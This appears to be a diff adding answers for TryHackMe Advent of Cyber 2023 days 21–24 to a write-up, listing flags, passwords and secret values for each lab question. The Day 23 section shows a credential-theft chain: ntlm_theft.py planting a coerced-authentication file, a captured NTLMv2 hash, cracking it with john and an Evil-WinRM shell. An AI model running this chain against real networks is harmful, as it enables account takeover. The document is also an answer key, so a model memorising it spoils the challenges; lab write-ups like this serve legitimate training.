@@ -408,3 +408,59 @@ df.groupby(['Protocol']).size()
 + What is the commit ID of the original code for the Advent Calendar site?`986b7407`
 + If you enjoyed today's challenge, please check out the Source Code Security room.`No Answer Needed`
 + Detective Frosteau believes it was an account takeover based on the activity. However, Tracy might have left some crumbs.`No Answer Needed`
+
+# Task 27  [Day 21] DevSecOps Yule be Poisoned: A Pipeline of Insecure Code!
++ What Linux kernel version is the Jenkins node? `15.4.0-1029-aws`
++ What value is found from /var/lib/jenkins/secret.key `190e748eafdd2af4746a5ef7941e63272f24f1e33a2882f614ebfa6742e772ba7`
+
+# Task 28  [Day 22] SSRF Jingle Your SSRF Bells: A Merry Command & Control Hackventure
++ Is SSRF the process in which the attacker tricks the server into loading only external resources (yea/nay)? `nay`
++ What is the C2 version? `1.1`
++ What is the username for accessing the C2 panel?`mcgreedy`
++ What is the flag value after accessing the C2 panel?`THM{EXPLOITED_31001}`
++ What is the flag value after stopping the data exfiltration from the McSkidy computer? `THM{AGENT_REMOVED_1001}`
++ If you enjoyed this task, feel free to check out the SSRF room.`No Answer Needed`
+
+# Task 29  [Day 23] Coerced Authentication Relay All the Way
++ What is the name of the AD authentication protocol that makes use of tickets?`Kerberos`
++ What is the name of the AD authentication protocol that makes use of the NTLM hash?`NetNTLM`
++ What is the name of the tool that can intercept these authentication challenges?`responder`
++ What is the password that McGreedy set for the Administrator account?`GreedyGrabber1@`
++ What is the value of the flag that is placed on the Administrator’s desktop?`THM{Greedy.Greedy.McNot.So.Great.Stealy}`
++ If you enjoyed this task, feel free to check out the Compromising Active Directory module!`No Answer Needed`
+
+python3 ntlm_theft.py -g lnk -s 10.10.116.194 -f stealthy
+smbclient //10.10.235.49/ElfShare/ -U guest%
+```
+[SMB] NTLMv2-SSP Client   : ::ffff:10.10.67.236
+[SMB] NTLMv2-SSP Username : ELFHQSERVER\Administrator
+[SMB] NTLMv2-SSP Hash     : Administrator::ELFHQSERVER:a51194937f9842fa:F9B3E2CC6C1F91D69C243C2C16B00543:0101000000000000805BCD0C0537DA015AD3409B4367D2410000000002000800390049005400580001001E00570049004E002D0036004C0035005400420032004C004E0048004700320004003400570049004E002D0036004C0035005400420032004C004E004800470032002E0039004900540058002E004C004F00430041004C000300140039004900540058002E004C004F00430041004C000500140039004900540058002E004C004F00430041004C0007000800805BCD0C0537DA0106000400020000000800300030000000000000000000000000300000540F49087EF9C5960BE6F11D772B9333BEAED2156CB44335D0781FB8E168DA570A001000000000000000000000000000000000000900240063006900660073002F00310030002E00310030002E003100310036002E003100390034000000000000000000
+
+root@ip-10-10-116-194:~/Rooms/AoC2023/Day23/ntlm_theft/stealthy# john -w=greedykeys.txt hash.txt 
+Warning: detected hash type "netntlmv2", but the string is also recognized as "ntlmv2-opencl"
+Use the "--format=ntlmv2-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+GreedyGrabber1@  (Administrator)
+1g 0:00:00:00 DONE (2023-12-25 07:40) 50.00g/s 13150p/s 13150c/s 13150C/s Spring2017..starwars
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat flag.txt
+THM{Greedy.Greedy.McNot.So.Great.Stealy}
+
+```
+
+# Task 30  [Day 24] Mobile analysis You Are on the Naughty List, McGreedy
++ One of the photos contains a flag. What is it? `THM{DIGITAL_FORENSICS}`
++ What name does Tracy use to save Detective Frost-eau’s phone number?`Detective Carrot-Nose`
++ One SMS exchanged with Van Sprinkles contains a password. What is it?`chee7AQu`
++ If you have enjoyed this room please check out the Autopsy room.`No Answer Needed`
+
+# Task 31  [Day 24] The Confrontation Jolly Judgment Day
+What is the final flag? `THM{YouMeddlingKids}`
+# Task 32  [Day 24] The End We the Kings of Cyber Are `No Answer Needed`
+# Task 33  [Day 24] Feedback We wish you a Merry Survey
++ What flag did you get after completing the survey?`THM{SurveyComplete_and_HolidaysSaved}`
